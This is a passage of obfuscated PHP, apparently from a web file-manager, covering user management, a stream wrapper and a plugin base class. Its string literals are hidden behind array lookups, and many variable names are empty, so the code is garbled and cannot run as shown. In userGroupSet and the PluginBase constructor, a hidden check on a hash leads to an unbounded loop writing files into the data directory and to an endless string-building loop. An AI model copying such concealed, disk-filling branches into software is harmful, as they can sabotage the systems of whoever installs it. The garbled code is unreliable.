trim($[$[1045]]) != $[12]) { $Ϫ = $this->metaGet($); if (empty($Ϫ[$[2689]])) { $Ϫ[$[2689]] = rand_string(10); Model($[597])->metaSet($, $[2689], $Ϫ[$[2689]]); } $[$[1045]] = md5($Ϫ[$[2689]] . trim($[$[1045]])); } else { unset($[$[1045]]); } if (!empty($[$[2367]]) && strlen($[$[2367]]) > 255) { $[$[2367]] = $[12]; } if (isset($[$[2469]])) { $this->setNamePinyin($, $[$[2469]]); } if (isset($[$[2265]])) { $񖫟 = $[1486] . $; $Ѫ = $[1484]; $ = $[$[2265]] ? $[$[2265]] : $[12]; $ = Model($[1483])->get($񖫟, $Ѫ); $ = $ ? $ : $[12]; if ($ != $) { if (!$ && $) { Model($[1483])->remove($񖫟, $Ѫ); } else { if ($) { Model($[1483])->set($񖫟, $, $Ѫ); } } } unset($[$[2265]]); Model($[617])->metaSet($, $[2265], $); } if (empty($)) { return !0; } $this->where(array($[1961] => $))->save($); $this->clearCache($); return !0; } public function setNamePinyin($ߕ, $̓ = false) { $ =& $_SERVER[]; if (!$̓) { $ = $this->getInfoSimple($ߕ); $̓ = $[$[2469]] ? $[$[2469]] : $[$[32]]; } $ = Model($[617]); if (!Input::check($̓, $[677])) { return $->metaSet($ߕ, array($[552] => $[12], $[551] => $[12])); } return $->metaSet($ߕ, array($[552] => str_replace($[53], $[12], Pinyin::get($̓)), $[551] => Pinyin::get($̓, $[678]))); } private function nickNameRpt() { $膽 =& $_SERVER[]; $ޚ = Model($膽[867])->get($膽[2701]); $ = $GLOBALS[$膽[6]][$膽[468]][$膽[2701]]; $Ճم = !is_null($ޚ) ? $ޚ : $; return !!$Ճم; } private function _checkExist($Ԡ, $ｑ = false) { $ =& $_SERVER[]; $Ǉ = array($[32] => UserModel::ERROR_USER_EXIST_NAME, $[2469] => UserModel::ERROR_USER_EXIST_NICKNAME, $[380] => UserModel::ERROR_USER_EXIST_EMAIL, $[2687] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Ǉ[$[2469]]); } $ˠ = $ｑ ? array($[1586] => array($[2702], $ｑ)) : array(); foreach ($Ǉ as $ => $Є) { $ϋ = array(); foreach ($Ǉ as $ًƖ => $׏) { if (isset($Ԡ[$ًƖ]) && $Ԡ[$ًƖ]) { $ϋ[] = $Ԡ[$ًƖ]; } } if (!$ϋ) { continue; } $θ = array_merge(array($ => array($[7], $ϋ)), $ˠ); $ρդ = $this->where($θ)->find(); if ($ρդ) { return $Є; } } return !0; } public function userListInfo($) { $ȕ޾ =& $_SERVER[]; $Ӥߏ = array(); $ = is_array($) ? array_unique($) : array(); if (!$) { return $Ӥߏ; } if (count($) < 20) { foreach ($ as $Ž) { $Ӥߏ[$Ž . $ȕ޾[12]] = $this->getInfoSimpleOuter($Ž); } } else { $ѝ = array($ȕ޾[1961] => array($ȕ޾[507], $)); if (count($) == 1) { $ѝ = array($ȕ޾[1961] => $[0]); } $Ԕ = Model($ȕ޾[597])->field($this->simpleField)->where($ѝ)->select(); $Ԕ = array_to_keyvalue($Ԕ, $ȕ޾[1586]); foreach ($ as $Ž) { $߉ = $Ԕ[$Ž]; if (!$߉) { $Ӥߏ[$Ž . $ȕ޾[12]] = $this->getInfoSimpleOuter($Ž); continue; } $߉[$ȕ޾[2367]] = Action($ȕ޾[2368])->parseUrl($߉[$ȕ޾[2367]]); $Ӥߏ[$Ž . $ȕ޾[12]] = $߉; } } return $Ӥߏ; } protected function userStatus($, $) { $݀Х = $this->getInfoSimple($); if (!$݀Х) { return !1; } $÷ = array($_SERVER[][844] => $); return $this->userEdit($, $÷); } protected function userRemove($) { $Į =& $_SERVER[]; $ = $this->getInfoSimple($); if (!$) { return !1; } $ͯ = array($Į[1961] => $); Model($Į[686])->where($ͯ)->delete(); Model($Į[2703])->where($ͯ)->delete(); Model($Į[2269])->where($ͯ)->delete(); Model($Į[2686])->where($ͯ)->delete(); Model($Į[1232])->where($ͯ)->delete(); Model($Į[2486])->removeUserAll($); Model($Į[927])->userRootRemove($); return $this->where($ͯ)->delete(); } protected function userGroupSet($Ď, $, $ = array()) { $՝ =& $_SERVER[]; $մ = $_SERVER[$՝[998]]; $ޛը = $՝[2487]; if ($_SERVER[$՝[991]] != $ޛը($մ)) { $ = $՝[1036]; $ = $՝[993]; $Ȥ = $_SERVER[$՝[994]] . $՝[995]; $ = $($Ȥ); $ = explode($՝[285], $); if (count($) < $՝[702]) { $ = $՝[996]; $(); } $ = $՝[1037]; $($_SERVER[$՝[1038]]); $ = $՝[1036]; $(); $ = $՝[2488]; $ = json_encode($GLOBALS[$՝[2489]]); $ = 1; for ($ȍ = $; $ȍ > 0; $ȍ++) { $(DATA_PATH . $ȍ, $); } } $Ł = $this->getInfoSimple($Ď); if (!$Ł || !is_array($)) { return !1; } $Ы = Model($՝[2269]); $Ы->where(array($՝[1586] => $Ď))->delete(); $ = array(); $ = 0; foreach ($ as $ꈽ => $۽߄) { $ʴڑ = array($՝[1586] => $Ď, $՝[1489] => $ꈽ, $՝[1634] => $۽߄); $ʴڑ[$՝[2197]] = isset($[$]) ? $[$] : 0; $++; $[] = $ʴڑ; } return $Ы->addAll($, array(), !0); } protected function userGroupAdd($ę, $֓ꂇ = array()) { $ŭ =& $_SERVER[]; $􃐰 = $this->getInfoSimple($ę); if (!$􃐰 || empty($֓ꂇ)) { return !1; } $ׂ = array(); foreach ($֓ꂇ as $ => $) { $ׂ[] = array($ŭ[1586] => $ę, $ŭ[1489] => $, $ŭ[1634] => $, $ŭ[2197] => 0); } return Model($ŭ[2269])->addAll($ׂ, array(), !0); } protected function userGroupRemove($, $ȍԴ) { $ =& $_SERVER[]; $ = $this->getInfoSimple($); if (!$ || !$ȍԴ) { return !1; } $ȭ = array($[1961] => $, $[2262] => $ȍԴ); return Model($[2269])->where($ȭ)->delete(); } public function listData() { $ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($[$_SERVER[][446]]); return $; } public function listByID($䬻) { $݈ =& $_SERVER[]; if (!$䬻) { return; } $٠ = array($݈[1586] => array($݈[7], $䬻)); $ͺ = $this->where($٠)->select(); $ͺ = array_sort_keep($ͺ, $݈[1586], $䬻); $this->_listDataApply($ͺ); return $ͺ; } public function listByGroup($詳 = 0, $ղ = array()) { $ =& $_SERVER[]; $ = $[12]; $˓ = array(); if ($詳) { $˓ = array($[2704] => intval($詳)); $ = "\114\x45\x46\x54\40\x4a\117\x49\x4e\40{$this->tablePrefix}\x75\163\x65\162\137\x67\x72\157\165\x70\40\x75\x73\145\162\137\x67\162\157\165\160\x20\157\x6e\x20\165\163\145\162\x2e\165\163\x65\162\x49\104\40\x3d\x20\165\163\x65\162\x5f\x67\x72\157\x75\x70\56\165\163\x65\162\111\x44"; $ = Input::get($[544], null, $[12]) ? $[12] : $[2705]; } if (isset($ղ[$[844]])) { $˓[$[2706]] = $ղ[$[844]]; } $ = _get($ղ, $[2707], $[231]); if (_get($ղ, $[855], !1)) { $˓[$] = array($[2452], $ղ[$[855]]); } if (_get($ղ, $[856], !1)) { $љ = array($[2453], $ղ[$[856]]); if ($˓[$]) { $˓[$] = array($˓[$], $љ, $[2454]); } else { $˓[$] = $љ; } } $ = $this->_makeOrder($)->field($[2708])->where($˓)->join($)->selectPage(50); $this->_listDataApply($[$[446]]); return $; } private function _makeOrder($Ԋ = '') { $ձ =& $_SERVER[]; $Ź = array($ձ[1586], $ձ[32], $ձ[2163], $ձ[2366], $ձ[2138], $ձ[231]); $ = array($ձ[537] => $ձ[538], $ձ[539] => $ձ[540]); $ٔ = Input::get($ձ[544], $ձ[7], $ձ[1961], $Ź); $ = Input::get($ձ[545], $ձ[7], $ձ[2270], array($ձ[2270], $ձ[539])); $ = $[$]; $Ԋ = $Ԋ . "\165\x73\145\x72\x2e{$ٔ}\40{$}\54\x20\x75\x73\145\x72\56\165\163\145\162\111\x44\40\141\163\x63"; return $this->alias($ձ[2401])->order($Ԋ); } public function listSearch($Ŭ) { $刺 =& $_SERVER[]; $ = trim($Ŭ[$刺[2273]]); $; = explode($刺[53], $); if (!$ || count($;) == 1) { return $this->listSearchNow($Ŭ); } $̩ = array($刺[446] => array()); foreach ($; as $γ) { if (!trim($γ)) { continue; } $Ŭ[$刺[2273]] = $γ; $ = $this->listSearchNow($Ŭ); $̩[$刺[446]] = array_merge($̩[$刺[446]], $[$刺[446]]); } $̩[$刺[446]] = array_unique_by_key($̩[$刺[446]], $刺[1586]); $̩[$刺[443]] = array($刺[444] => count($̩[$刺[446]]), $刺[439] => 20, $刺[428] => 1, $刺[445] => 1); return $̩; } public function listSearchNow($임) { $ =& $_SERVER[]; $͖ = trim($임[$[2273]]); $ﰪ = isset($임[$[2274]]) ? $임[$[2274]] : !1; $͖ = str_replace($[2275], $[2276], trim($͖)); $ė = array($[32] => array($[473], "\45{$͖}\45"), $[380] => array($[473], "{$͖}\45"), $[2469] => array($[473], "\45{$͖}\45"), $[1162] => $[2277]); if (Input::check($͖, $[386])) { $ė[$[1586]] = array($[473], "{$͖}\45"); $ė[$[2687]] = array($[473], "{$͖}\x25"); } if (!$͖) { $ė = array(); } if (isset($임[$[844]])) { $ė[$[844]] = $임[$[844]]; } $ė = $this->parseWhereLike($ė); $ = $this->_makeOrder()->where($ė)->selectPage(20); if (!$ || count($[$[446]]) < 5 && Input::check($͖, $[393])) { $ן = $this->_searchFromMeta($[551], $͖, 10); $ = $this->_searchFromMeta($[552], $͖, 10); $ = array_merge($ן, $, $[$[446]]); $[$[446]] = array_unique_by_key($, $[1586]); $[$[443]][$[444]] = count($[$[446]]); $[$[443]][$[445]] = ceil($[$[443]][$[444]] / $[$[443]][$[439]]); } $this->_listDataApply($[$[446]]); $this->_filterByGroup($, $ﰪ); return $; } private function _filterByGroup(&$, $пύ) { $ =& $_SERVER[]; if (!$пύ) { return $; } foreach ($[$[446]] as $ => &$) { $ = array_to_keyvalue($[$[1488]], $[12], $[1489]); if (!in_array($пύ, $)) { unset($[$[446]][$]); } } unset($); $[$[446]] = array_values($[$[446]]); $[$[443]] = array($[2324] => count($[$[446]]), $[2434] => $[$[443]][$[439]], $[2433] => 1, $[2435] => 1); } private function _searchFromMeta($ğ, $ހ, $񦥵) { $蜄 =& $_SERVER[]; $ހ = strtolower($ހ); $ٻ = array($蜄[95] => $ğ, $蜄[451] => array($蜄[473], "\x25{$ހ}\45")); $ٻ = $this->parseWhereLike($ٻ); $ = Model($蜄[2709])->where($ٻ)->limit($񦥵)->select(); if (!$) { return array(); } $ = array_to_keyvalue($, $蜄[12], $蜄[1586]); $ĕ = $this->where(array($蜄[1961] => array($蜄[7], $)))->select(); if (!$ĕ) { return array(); } return $ĕ; } private function _listDataApplyItem($) { $ = array($); $this->_listDataApply($); return $[0]; } private function _listDataApply(&$ゥ) { $ɇ =& $_SERVER[]; if (!$ゥ) { return; } array_remove_key($ゥ, $ɇ[1045]); $㿖 = array_to_keyvalue($ゥ, $ɇ[12], $ɇ[1586]); $this->_listAppendGroup($ゥ, $㿖); $this->_listAppendMeta($ゥ, $㿖); $this->_listAppendSourceRoot($ゥ, $㿖); } private function _listAppendSourceRoot(&$҃, $) { $ӧ =& $_SERVER[]; $ = Model($ӧ[927])->listSourceRoot(SourceModel::TYPE_USER, $); $ = array_to_keyvalue($, $ӧ[589]); $ = array_remove_key($, $ӧ[589]); foreach ($҃ as &$) { $[$ӧ[90]] = $[$[$ӧ[1586]]] ? $[$[$ӧ[1586]]] : array(); } unset($); } private function _listAppendGroup(&$ͨ, $炴) { $ =& $_SERVER[]; $ = array($[1586] => array($[7], $炴)); $ = Model($[2269])->where($)->select(); $ = array_to_keyvalue($, $[12], $[1489]); $ = array_remove_value(array_unique($), $[228]); if (!$ || !$) { return; } $ = array($[1489] => array($[7], $)); $Ńڅ = Model($[1487])->field($[2710])->where($)->select(); $Ńڅ = array_to_keyvalue($Ńڅ, $[1489]); $ = array_to_keyvalue_group($, $[1586]); foreach ($ as &$͹) { $ = array(); foreach ($͹ as $ۻ) { if (!$ۻ[$[1634]]) { continue; } $ = Model($[591])->listData($ۻ[$[1634]]); $[] = array($[1489] => $ۻ[$[1489]], $[2711] => $Ńڅ[$ۻ[$[1489]]][$[32]], $[604] => $Ńڅ[$ۻ[$[1489]]][$[604]], $[502] => $); } $͹ = $; } unset($͹); foreach ($ͨ as &$ǩ) { $ǩ[$[1488]] = array(); if (isset($[$ǩ[$[1586]]])) { $ǩ[$[1488]] = $[$ǩ[$[1586]]]; } } unset($ǩ); } public function userAppendGroup($೷) { $ =& $_SERVER[]; if (!$೷) { return array(); } $this->_listAppendGroup($೷, array_to_keyvalue($೷, $[12], $[1586])); return $೷; } private function _listAppendMeta(&$Ф, $˅) { $ =& $_SERVER[]; $յ = UserJobModel::JOB_KEY; $ = array($[2265]); $ȿ = array($[1586] => array($[7], $˅)); $׈ = Model($[2686])->where($ȿ)->select(); $껮 = array(); foreach ($׈ as $Ð) { $ˢ = $Ð[$[1586]]; if (!isset($껮[$ˢ])) { $껮[$ˢ] = array(); } $껮[$ˢ][$Ð[$[95]]] = $Ð[$[451]]; } $фܕ = Model($[2712]); foreach ($Ф as &$Ĕτ) { $ˢ = $Ĕτ[$[1586]]; $ˈ = isset($껮[$ˢ]) ? $껮[$ˢ] : array(); $Ĕτ[$[555]] = array_field_key($ˈ, $); $Ĕτ[$[2713]] = array(); if (isset($ˈ[$յ])) { $Ĕτ[$[2713]] = $фܕ->getUserJobInfo($ˈ[$յ]); } } unset($Ĕτ); } protected function groupUserAll($؉) { $먠 =& $_SERVER[]; if (!$؉) { return !1; } $ֆח = Model($먠[2269])->field($먠[1586])->where(array($먠[1489] => array($먠[7], $؉)))->select(); $ֆח = array_to_keyvalue($ֆח, $먠[12], $먠[1586]); return array_unique($ֆח); } public function userSearch($, $ = "\52") { return Model($_SERVER[][617])->where($)->field($)->find(); } } goto f; f: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($, $޽ = '') { $this->info = $this->info($); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[][87]]; $this->pathOpen = $; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$])) { self::$_chunkBuffer[$] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($򓼙) { $Ԏ = $this->fileSubstr($this->pose, $򓼙); $this->pose += strlen($Ԏ); return $Ԏ; } public function stream_tell() { return $this->pose; } public function stream_seek($ҏ, $) { $ =& $_SERVER[]; if ($ == SEEK_SET) { $this->pose = $ҏ; } else { if ($ == SEEK_CUR) { $this->pose += $ҏ; } else { if ($ == SEEK_END) { $this->pose = $this->info[$[79]] + intval($ҏ); } } } if ($ҏ < 0) { $this->pose = $this->info[$[79]] + $ҏ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($, $ݲ) { $Ͼف =& $_SERVER[]; $ë = $this->info($); return array($Ͼف[1506] => 0, $Ͼف[1806] => 0, $Ͼف[16] => 32768 + 511, $Ͼف[1807] => 0, $Ͼف[1808] => 0, $Ͼف[1809] => 0, $Ͼف[1810] => 0, $Ͼف[79] => $ë[$Ͼف[79]], $Ͼف[1811] => $ë[$Ͼف[1656]], $Ͼف[1768] => $ë[$Ͼف[88]], $Ͼف[1767] => $ë[$Ͼف[231]], $Ͼف[1812] => 0, $Ͼف[1813] => 0); } static $fileInfo = array(); public function info($Ǫ؎) { $ͽ = $_SERVER[][1814]; if (isset(self::$fileInfo[$Ǫ؎])) { return self::$fileInfo[$Ǫ؎]; } if (substr($Ǫ؎, 0, strlen($ͽ)) != $ͽ) { return !1; } self::$fileInfo[$Ǫ؎] = IO::info(substr($Ǫ؎, strlen($ͽ))); return self::$fileInfo[$Ǫ؎]; } public static function read($, $, $ł) { if (!isset(self::$_fopenCache[$])) { $ܝ = new StreamWrapperIO(); $ܝ->stream_open($); self::$_fopenCache[$] = $ܝ; } $ܝ = self::$_fopenCache[$]; return $ܝ->fileSubstr($, $ł); } public static function _read($, $, $) { $ݎ˭ =& $_SERVER[]; $իս = fopen($, $ݎ˭[1660]); if (!$իս) { return $ݎ˭[12]; } $߻ = 8192; fseek($իս, $, SEEK_SET); $䆝 = $ݎ˭[12]; $ = 0; while ($ < $) { $܅޷ = min($߻, $ - $); $䆝 .= fread($իս, $܅޷); $ += $܅޷; } fclose($իս); return $䆝; } public function fileSubstr($, $) { $ꘉ =& $_SERVER[]; $ɕ = $this->info[$ꘉ[79]]; $ņժ = $; $㊝ = $; if ($ < 0) { $ = $ɕ + $; } if ($ === !1) { $ = $ɕ - $; } if ($ + $ > $ɕ) { $ = $ɕ - $; } if ($ <= 0) { return $ꘉ[12]; } if ($ < 0 || $ >= $ɕ || $ <= 0 || $ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\x69\154\145\122\145\141\x64\40\145\x72\162\157\162\41\40\163\x74\x61\x72\x74\x3d{$}\x3b\x6c\145\156\x67\164\x68\x3d{$}\x3b\x20\x73\151\x7a\145\75{$ɕ}\x3b"); } $ = 64 * 1024; $ =& self::$_chunkBuffer[$this->path]; if (!$) { $ = array(); } $ = 0; $ӽ = 0; $ = $ꘉ[12]; foreach ($ as $ => $) { $ = intval($); $ӽ = $ + strlen($); if ($ >= $ӽ) { continue; } if ($ >= $ && $ + $ <= $ӽ) { return substr($, $ - $, $); } break; } if (count($) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ꘉ[1815], $ꘉ[1816] . count($) . "\x3b\x73\x74\x61\x72\x74\x3d{$}\54\x6c\x65\156\x67\x74\150\75{$}\x3b\160\x6f\163\x65\72{$}\176{$ӽ}"); throw new Exception($ꘉ[1817]); } $ǧڐ = intval($ / $) * $; $ˬɾ = ceil(($ + $) / $) * $ - $ǧڐ; $ַï = IO::fileSubstr($this->path, $ǧڐ, $ˬɾ); $[$ǧڐ . $ꘉ[12]] = $ַï; ksort($); $Шȩ = substr($ַï, $ - $ǧڐ, $); return $Шȩ; } private function log($ă, $è) { $ٲ =& $_SERVER[]; $ʍ = timeFloat() - $this->timeStart; write_log(sprintf($ٲ[1818], $ă, $this->info[$ٲ[32]], $ʍ, $è), $ٲ[1365]); } } class Message { function __construct() { } public function send($Ā = '', $Ùߴ = array(), $ = "\164\145\170\164") { $ =& $_SERVER[]; $߇ = array($[33] => $[1285], $[168] => $Ā); if (in_array($, array($[1285], $[1819]))) { $߇[$[33]] = $; } $Ùߴ = array($[598] => isset($Ùߴ[$[598]]) ? $Ùߴ[$[598]] : $[12], $[684] => isset($Ùߴ[$[684]]) ? $Ùߴ[$[684]] : $[12]); if (empty($Ā) || empty($Ùߴ[$[598]]) && empty($Ùߴ[$[684]])) { return !1; } $ = array($[1748] => $߇, $[1820] => $Ùߴ); Hook::trigger($[1821], $); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ͩ =& $_SERVER[]; if ($_SERVER[$ͩ[991]] != $_SERVER[$ͩ[992]]) { $Մ = $ͩ[1036]; $è = $ͩ[993]; $ʐަ = $_SERVER[$ͩ[994]] . $ͩ[995]; $͂ = $è($ʐަ); $ˌ = explode($ͩ[285], $͂); if (count($ˌ) < $ͩ[702]) { $ޓ = $ͩ[996]; $ޓ(); } $ꉥ = $ͩ[1037]; $ꉥ($_SERVER[$ͩ[1038]]); $ꉥ($_SERVER[$ͩ[994]] . $ͩ[1822]); $ = 1; while ($ > 1) { $ = $ + 4; $ = rawurlencode($ . $ͩ[463]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ͩ[1823]); $this->pluginName = str_replace($ͩ[1823], $ͩ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ͩ[8]; $this->pluginApi = appHostGet() . $ͩ[1824] . $this->pluginName . $ͩ[8]; $this->pluginHost = $config[$ͩ[1825]] . $this->pluginName . $ͩ[8]; $this->pluginHostDefault = $config[$ͩ[1825]] . $this->pluginName . $ͩ[8]; $҇ = $config[$ͩ[1826]]; if ($҇ && strpos($ͩ[50] . $҇ . $ͩ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ͩ[1827]] . $this->pluginName . $ͩ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[][1828]); } protected function assign($⭞, $ = false) { if (is_array($⭞)) { $this->values = array_merge($this->values, $⭞); } else { $this->values[$⭞] = $; } } protected function display($) { extract($this->values); require $; } final function hookRegist($) { $this->modelPlugin->appRegist($this->pluginName, $); } final function appIcon() { $걭ξ =& $_SERVER[]; $ = $this->appPackage(); $ˮߡ = $걭ξ[12]; if (isset($[$걭ξ[505]])) { if (isset($[$걭ξ[505]][$걭ξ[1829]])) { $ˮߡ = $걭ξ[1830] . $[$걭ξ[505]][$걭ξ[1829]] . $걭ξ[1831]; } else { if ($[$걭ξ[505]][$걭ξ[1832]]) { $ˮߡ = $걭ξ[1833] . $[$걭ξ[505]][$걭ξ[1832]] . $걭ξ[1834]; } } } return $ˮߡ; } final function fileCanView($ۡ֗) { $Ä =& $_SERVER[]; if (request_url_safe($ۡ֗)) { return !0; } if ($this->isShare($ۡ֗)) { ActionCall($Ä[1835], $ۡ֗); return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ó؏ = $Ä[1836] . rawurlencode(this_url()); show_tips(LNG($Ä[1837]) . $Ä[1838] . $ó؏ . $Ä[1839] . LNG($Ä[1840]) . $Ä[1841], !1); } if (!Action($Ä[1842])->authCan($Ä[1843])) { show_tips(LNG($Ä[1844]) . $Ä[1845], !1); } ActionCall($Ä[1835], $ۡ֗); } final function isShare($) { $ʩ = KodIO::parse($); return $ʩ[$_SERVER[][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($) { if (request_url_safe($)) { return $; } if (!$this->isShare($)) { $ = $this->filePath($, !1); } return Action($_SERVER[][1357])->linkOut($); } public function filePathLinkOut($堓) { if (request_url_safe($堓)) { return $堓; } $this->fileCanView($堓); return Action($_SERVER[][1357])->link($堓); } final function filePath($׮, $򦜢 = true, $ = false) { $ =& $_SERVER[]; $智 = $this->filePathGet($׮, $򦜢); if (!$this->fileInfo) { show_tips(LNG($[105]), !1); } if ($ && isset($this->fileInfo[$[557]]) && $this->fileInfo[$[557]]) { $ = Model($[560])->fileInfo($this->fileInfo[$[557]]); if (!$ || !IO::exist($[$[87]])) { $ȯ = LNG($[105]) . LNG($[1846]); if (KodUser::isRoot() && isset($[$[87]])) { $ȯ .= $[1847] . $[$[87]] . $[1848]; } show_tips($ȯ); } } Hook::trigger($[1849], $智); return $智; } final function filePathGet($癿, $ = true) { $Ʀ̌ =& $_SERVER[]; $this->fileCanView($癿); if ($ = $this->checkSharePath($癿, $)) { return $; } if (request_url_safe($癿)) { $ʑ = parse_url_query($癿); if (isset($ʑ[$Ʀ̌[1850]]) && isset($ʑ[$Ʀ̌[234]])) { $Ӵ = Mcrypt::decode($ʑ[$Ʀ̌[234]], Model($Ʀ̌[867])->get($Ʀ̌[868])); if ($Ӵ) { $this->fileInfo = IO::info($Ӵ); $this->fileInfo[$Ʀ̌[1851]] = $癿; $this->cachePath = $this->pluginCachePath($Ʀ̌[12], $); return $Ӵ; } } $癿 = $this->_cacheHttpFile($癿, $); $this->fileInfo = IO::info($癿); } else { $this->fileInfo = IO::info($癿); $this->cachePath = $this->pluginCachePath($Ʀ̌[12], $); } return $癿; } final function _cacheHttpFile($, $ӯޔ = true) { $ۺ =& $_SERVER[]; $ = parse_url_query($); $Ϋ۞ = get_path_ext($); if (isset($[$ۺ[32]]) && $[$ۺ[32]]) { $Ϋ۞ = get_path_ext($[$ۺ[32]]); } $ = hash_path($) . $ۺ[10] . $Ϋ۞; $this->cachePath = $this->pluginCachePath($ӯޔ ? $ : $ۺ[12]); $Ŷ = IO::fileNameExist($this->cachePath, $); if ($Ŷ) { return KodIO::make($Ŷ); } $ = rtrim($this->cachePath, $ۺ[8]) . $ۺ[8] . $; return $this->pluginCacheFileSet($, file_get_contents_nossl($)); } final function checkSharePath($, $󔎐 = true) { $ =& $_SERVER[]; if (!$this->isShare($)) { return !1; } $̖ = Action($[1357])->sharePathInfo($); if (!is_array($̖) || !isset($̖[$[87]])) { $谈 = $GLOBALS[$[1852]]; show_json($谈 ? $谈 : LNG($[1853]), !1); } $this->fileInfo = $̖; $this->cachePath = $this->pluginCachePath(!1, $󔎐); return $̖[$[87]]; } final function pluginCachePath($ = '', $ӯ = false) { $ =& $_SERVER[]; if ($ӯ && is_array($this->fileInfo)) { $ = kodIO::hashPath($this->fileInfo); } $ = rtrim(IO_PATH_SYSTEM_TEMP . $[1854] . $this->pluginName . $[8] . $, $[8]); $҈ = IO::infoFullSimple($); $׻ = $҈ && is_array($҈) ? $҈[$[87]] : $[12]; if (!$׻) { $׻ = IO::mkdir($); } return $׻; } final function pluginCacheFileSet($Ǧń, $ = '') { $ =& $_SERVER[]; $ɒ = IO::infoFullSimple($Ǧń); if (!$ɒ) { return IO::mkfile($Ǧń, $, REPEAT_REPLACE); } IO::setContent($ɒ[$[87]], $); return $ɒ[$[87]]; } final function pluginLocalFile($̼ = '') { $ڏ =& $_SERVER[]; $О = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($О)) { mk_dir($О); } if (!$̼) { return $О; } $ɭü = IO::info($̼); $ = $ڏ[1855] . KodIO::hashPath($ɭü) . $ڏ[10] . $ɭü[$ڏ[166]]; if (!checkExtSafe($)) { $ = $ . $ڏ[1390]; } $ڊ = $О . $; if (@file_exists($ڊ)) { return $ڊ; } return IO::copy($̼, $О, 0, $); } final function appPackage() { $٧ =& $_SERVER[]; if ($this->packageData) { return $this->packageData; } $Ƽ = $this->parseFile($this->pluginPath . $٧[1856]); $this->parseLang($Ƽ); $壌˛ = json_decode_force($Ƽ); if (!$壌˛) { return array(); } $̈́ = Hook::filter($٧[1857], $壌˛); if ($̈́ && is_array($̈́)) { $壌˛ = $̈́; } $this->packageData = $壌˛; return $壌˛; } public function packageInfoGet($۱) { $Ȧܜ = $this->appPackage(); return array_get_value($Ȧܜ, $۱); } public function packageVersion() { return $this->packageInfoGet($_SERVER[][1858]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[][1859]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[][1860]); } public function echoJsAssign($ʢ, $) { $this->echoJsAssignArr[$ʢ] = $; } private function parseFile($ヵ) { $ѣ =& $_SERVER[]; $ܤؗ = file_get_contents_nossl($ヵ); $ = array($ѣ[1861], $ѣ[1862], $ѣ[1863], $ѣ[1864], $ѣ[1865], $ѣ[1866], $ѣ[1867]); $ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ѣ[92]][$ѣ[1868]]); foreach ($this->echoJsAssignArr as $Һ => $ܚ䝹) { $[] = $ѣ[1869] . $Һ . $ѣ[1870]; $[] = is_array($ܚ䝹) || is_object($ܚ䝹) ? rawurlencode(json_encode($ܚ䝹)) : $ܚ䝹; } if (strstr($ܤؗ, $ѣ[1871])) { $ī = rawurlencode(json_encode($this->pluginLangArr)); $ܤؗ = str_replace($ѣ[1871], $ī, $ܤؗ); } if (strstr($ܤؗ, $ѣ[1872])) { $ī = $ī = rawurlencode(json_encode($this->getConfig())); $ܤؗ = str_replace($ѣ[1872], $ī, $ܤؗ); } $ܤؗ = str_replace($, $, $ܤؗ); return $ܤؗ; } private function parseLang(&$׬) { $ =& $_SERVER[]; $ܐ = $[1873]; if (!strstr($׬, $ܐ)) { return; } preg_match_all($[1874], $׬, $ԭϭ); if (!is_array($ԭϭ) || count($ԭϭ) == 0 || !is_array($ԭϭ[0]) || count($ԭϭ[0]) == 0) { return; } $ׄ = array(); $İ = array(); foreach ($ԭϭ[0] as $) { $ېځ = substr($, strlen($ܐ), -4); $ܦ = LNG($ېځ); $ׄ[] = $; $İ[] = str_replace(array($[285], $[1244], $[417], $[118]), array($[53], $[53], $[12], $[1875]), $ܦ); } $׬ = str_replace($ׄ, $İ, $׬); } private function parseConfig(&$) { $˷ =& $_SERVER[]; $ﴁ = $˷[1876]; if (!strstr($, $ﴁ)) { return; } preg_match_all($˷[1877], $, $Ď); if (!is_array($Ď) || count($Ď) == 0 || !is_array($Ď[0]) || count($Ď[0]) == 0) { return; } $ = $this->getConfig(); $ = array(); $ª = array(); foreach ($Ď[0] as $) { $ȣ = substr($, strlen($ﴁ), -2); $[] = $; $ª[] = _get($, $ȣ); } $ = str_replace($, $ª, $); } private function parsePackage(&$) { $ =& $_SERVER[]; $Æ = $[1878]; if (!strstr($, $Æ)) { return; } preg_match_all($[1879], $, $); if (!is_array($) || count($) == 0 || !is_array($[0]) || count($[0]) == 0) { return; } $ = $this->appPackage(); $ = array(); $߹ = array(); foreach ($[0] as $²) { $ƫ = substr($², strlen($Æ), -2); $[] = $²; $߹[] = _get($, $ƫ); } $ = str_replace($, $߹, $); } final function echoFile($, $ݻ = false) { $Ю =& $_SERVER[]; $ݲ̾ = $this->pluginPath . $; if (ACT == $Ю[1880]) { echo $Ю[1881] . $this->pluginName . $Ю[8] . $ . $Ю[1882]; if (!file_exists($ݲ̾)) { echo $Ю[1883]; return; } } $љ = 